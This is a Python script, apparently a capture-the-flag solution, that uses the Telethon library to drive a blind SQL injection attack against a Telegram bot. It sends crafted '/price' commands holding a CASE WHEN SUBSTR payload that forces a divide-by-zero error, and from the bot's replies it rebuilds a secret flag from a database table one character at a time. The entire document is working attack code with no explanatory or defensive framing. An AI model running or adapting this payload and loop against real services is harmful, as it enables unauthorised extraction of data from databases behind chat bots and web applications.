from telethon.sync import TelegramClient, events
import time
import string

api_id = 0
api_hash = ""

charlists = string.ascii_lowercase + string.digits + "{}_@$#!" + string.ascii_uppercase + string.digits

SLEEP = 0.5
MSG = "the item you requested is not found"
CHAT = "@ctgrocerybot"

flag = ""

with TelegramClient('name', api_id, api_hash) as client:
    for pos in range(12, 42):
        for char in charlists:
            payload = "/price flag' AND (SELECT CASE WHEN (SUBSTR(flag," + str(pos) + ",1)='" + char + "') THEN 1/0 ELSE 'a' END FROM flags)='a"
            print("--> sending payload: " + payload)
            client.send_message(CHAT, payload)
            
            # get the last message
            last_message = client.get_messages(CHAT)
            if last_message[0].message == MSG:
                flag += char
                print("--> flag: " + flag)
                break

            print("--> sleeping for %d..." % SLEEP)
            time.sleep(SLEEP)
    print("--> flag: " + flag)
    client.run_until_disconnected()